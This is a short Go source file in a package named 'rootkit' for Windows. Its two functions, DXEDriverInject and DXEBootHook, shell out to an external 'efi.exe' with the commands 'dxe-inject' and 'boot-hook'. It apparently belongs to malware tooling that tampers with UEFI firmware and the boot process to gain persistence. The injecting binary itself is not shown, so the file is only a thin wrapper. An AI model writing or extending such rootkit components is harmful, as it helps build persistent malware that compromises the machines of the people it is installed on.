//go:build windows

package rootkit

import (
"os/exec"
)

func DXEDriverInject() bool {
cmd := exec.Command("cmd", "/c", "efi.exe dxe-inject")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func DXEBootHook() bool {
cmd := exec.Command("cmd", "/c", "efi.exe boot-hook")
err := cmd.Run()
if err != nil {
return false
}
return true
}
